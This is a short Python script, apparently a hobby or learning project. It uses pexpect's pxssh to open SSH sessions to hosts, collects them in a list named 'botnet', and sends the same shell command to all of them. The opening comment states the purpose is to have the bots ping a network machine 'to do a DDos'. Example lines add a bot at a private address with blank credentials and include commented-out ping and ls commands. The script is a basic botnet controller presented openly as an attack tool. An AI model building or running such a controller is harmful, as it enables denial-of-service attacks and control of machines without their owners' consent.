from pexpect import pxssh
#So we can use this when we are running mqtt in Arduino and python then  we'll write some commands like ping to any computer (it has to be in our network) using some bots from this code for to do a DDos
class Bot:

    # initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()


    # secure shell into client
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection failure.')
            print(e)


    # send command to client
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# send a command to all bots in the botnet
def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)

# list of bots in botnet
botnet = []

# add a new bot to your botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)
##Examples
add_bot('10.0.0.59', '', '')

# list user home directory
##command_bots('ls')

# download scripts/files etc.
##command_bots("""ping x.x.x.x"""")


